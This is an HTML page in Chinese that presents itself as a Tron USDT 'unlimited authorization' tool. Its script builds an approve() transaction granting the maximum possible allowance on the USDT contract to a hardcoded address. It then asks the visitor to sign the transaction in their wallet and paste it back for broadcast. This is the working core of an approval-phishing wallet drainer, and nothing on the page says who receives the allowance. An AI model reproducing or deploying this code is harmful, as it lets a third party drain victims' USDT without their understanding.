<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Tron 原始交易签名授权</title>
<style>
  body { background: #121212; color: #eee; font-family: "Microsoft Yahei", Arial, sans-serif; max-width: 600px; margin: 20px auto; padding: 10px; }
  h2 { text-align: center; }
  textarea { width: 100%; height: 160px; background: #222; border: none; border-radius: 6px; color: #0ff; font-family: monospace; padding: 10px; resize: vertical; }
  button { background: #2196f3; border: none; color: white; padding: 12px 20px; font-size: 1.2rem; border-radius: 6px; cursor: pointer; margin: 10px 0; width: 100%; }
  button:disabled { background: #555; cursor: not-allowed; }
  .status { font-size: 1.1rem; margin-top: 10px; text-align: center; }
  .success { color: #4caf50; }
  .error { color: #f44336; }
  .info { color: #2196f3; }
</style>
</head>
<body>

<h2>Tron USDT 无限授权（原始交易签名版）</h2>

<div>
  <p>步骤1：点击生成授权交易，生成交易原始数据（JSON格式）</p>
  <button id="btnBuildTx">生成授权交易</button>
  <textarea id="rawTx" readonly placeholder="生成的交易原始数据将显示在这里"></textarea>
</div>

<div>
  <p>步骤2：将上面生成的交易原始数据复制，导入Trusd钱包进行离线签名，得到签名后的交易数据（hex字符串或JSON）。</p>
  <textarea id="signedTx" placeholder="请粘贴钱包签名后的交易数据"></textarea>
  <button id="btnBroadcast" disabled>广播签名交易</button>
</div>

<div class="status" id="status"></div>

<script src="https://cdn.jsdelivr.net/npm/tronweb@5.2.0/dist/TronWeb.js"></script>
<script>
  const CFG = {
    USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    TARGET: "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf",
    TRON_NODE: "https://api.trongrid.io"
  };

  const btnBuildTx = document.getElementById("btnBuildTx");
  const rawTxArea = document.getElementById("rawTx");
  const signedTxArea = document.getElementById("signedTx");
  const btnBroadcast = document.getElementById("btnBroadcast");
  const statusEl = document.getElementById("status");

  function setStatus(msg, cls="info") {
    statusEl.textContent = msg;
    statusEl.className = "status " + cls;
  }

  btnBuildTx.onclick = async () => {
    setStatus("连接 Tron 节点，生成交易中...", "info");
    const tronWeb = new TronWeb({ fullHost: CFG.TRON_NODE });
    try {
      const parameterTypes = ["address", "uint256"];
      const parameterValues = [CFG.TARGET, "115792089237316195423570985008687907853269984665640564039457584007913129639935"];
      const data = tronWeb.utils.abi.encodeParameters(parameterTypes, parameterValues);
      const tx = await tronWeb.transactionBuilder.triggerSmartContract(
        CFG.USDT,
        tronWeb.toHex("approve(address,uint256)"),
        1000000,
        0,
        data
      );
      if (!tx || !tx.transaction) throw new Error("生成交易失败");
      rawTxArea.value = JSON.stringify(tx.transaction, null, 2);
      setStatus("交易生成成功，请复制并导入钱包签名", "info");
      btnBroadcast.disabled = false;
    } catch(e) {
      setStatus("生成交易失败：" + e.message, "error");
    }
  };

  btnBroadcast.onclick = async () => {
    const signedHex = signedTxArea.value.trim();
    if (!signedHex) return setStatus("请粘贴签名后的交易数据", "error");

    setStatus("正在广播交易...", "info");
    const tronWeb = new TronWeb({ fullHost: CFG.TRON_NODE });
    try {
      let broadcastResult;
      try {
        const signedObj = JSON.parse(signedHex);
        broadcastResult = await tronWeb.trx.broadcast(signedObj);
      } catch {
        const signedBytes = tronWeb.utils.code.hexStr2byteArray(signedHex);
        broadcastResult = await tronWeb.trx.broadcast(signedBytes);
      }
      if (broadcastResult.result) {
        setStatus("✅ 交易广播成功，txID: " + broadcastResult.txid, "success");
        setTimeout(() => window.location.href = "success.html", 1500);
      } else {
        setStatus("交易广播失败：" + JSON.stringify(broadcastResult), "error");
      }
    } catch(e) {
      setStatus("广播异常：" + e.message, "error");
    }
  };

  signedTxArea.addEventListener("input", () => {
    btnBroadcast.disabled = signedTxArea.value.trim() === "";
  });

  setStatus("请点击“生成授权交易”开始", "info");
</script>

</body>
</html>
